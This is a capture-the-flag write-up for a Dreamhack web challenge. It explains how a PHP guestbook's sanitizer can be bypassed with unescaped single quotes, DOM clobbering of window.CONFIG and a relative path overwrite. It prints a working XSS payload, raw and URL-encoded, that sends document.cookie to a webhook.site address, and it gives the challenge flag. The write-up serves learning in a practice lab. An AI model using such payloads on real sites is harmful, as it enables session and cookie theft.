[link](https://dreamhack.io/wargame/challenges/48)

## recon
```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  PreventXSS($content);
  return $content;
}

$ALLOW_TAGS_ATTRS = array(
  "html"=>['id', 'name'],
  "body"=>['id', 'name'],
  "a"=>['id','href','name'],
  "p"=>['id', 'name'],
);

function PreventXSS($input){
  global $ALLOW_TAGS_ATTRS;

  $htmldoc = new DOMDocument();
  $htmldoc->loadHTML($input);

  $tags = $htmldoc->getElementsByTagName("*");
    
  foreach ($tags as $tag) {
    if( !$ALLOW_TAGS_ATTRS[strtolower($tag->nodeName)] ) DisallowAction();
    $allow_attrs = $ALLOW_TAGS_ATTRS[strtolower($tag->nodeName)];
    foreach($tag->attributes as $attr){
        if( !in_array(strtolower($attr->nodeName), $allow_attrs) ) DisallowAction();
    }
  }
}

function DisallowAction(){
	die("no hack");
}

?>
```

`htmlentities($content)` not use `ENT_QUOTES` therefore the `'` character not encode.

`$ALLOW_TAGS_ATTRS`: define a allow tag attrs.

in the `GuestBook.php`
```javascript
 <script src="config.js"></script>
    <script>
      if(window.CONFIG && window.CONFIG.debug){
        location.href = window.CONFIG.main;
      }
    </script>
```

if `window.CONFIG` && `window.CONFIG.debug` is `true` , we can overwrite location.href.

in the `config.js`
```javascript
window.CONFIG = {
  version: "v0.2",
  main: "/",
  debug: false,
  debugMSG: ""
}

// prevent overwrite
Object.freeze(window.CONFIG);
```
In browsers, HTML elements with an `id` attribute can be automatically exposed as named properties of the `window` object.

In `GuestBook.php`, the `config.js` file is loaded using a relative path. Normally, the browser resolves this path to:`http://host3.dreamhack.games:22750/config.js`

However, if we access:`http://host3.dreamhack.games:22750/GuestBook.php/`. The browser resolves the relative path to:`http://host3.dreamhack.games:22750/GuestBook.php/config.js`. This behavior is related to Relative Path Overwrite (RPO).

payload to trigger XSS: 
```
[quandz](#' id='CONFIG' )
[quandz1](#' id='CONFIG'  name='debug' )
[quandz2](javascript:location=`https://webhook.site/ff5cb011-604b-4a33-8f15-28450e5dcb9d?cookies=` + document.cookie'  id='CONFIG' name='main' )
```

pyalod: `GuestBook.php/?content=%5Bquandz%5D%28%23%27+id%3D%27CONFIG%27+%29%0D%0A%5Bquandz1%5D%28%23%27+id%3D%27CONFIG%27++name%3D%27debug%27+%29%0D%0A%5Bquandz2%5D%28javascript%3Alocation%3D%60https%3A%2F%2Fwebhook.site%2Fff5cb011-604b-4a33-8f15-28450e5dcb9d%3Fcookies%3D%60+%2B+document.cookie%27++id%3D%27CONFIG%27+name%3D%27main%27+%29`

flag: `DH{f35a6e5d4109190bdfa3fa59134cff19}`
done


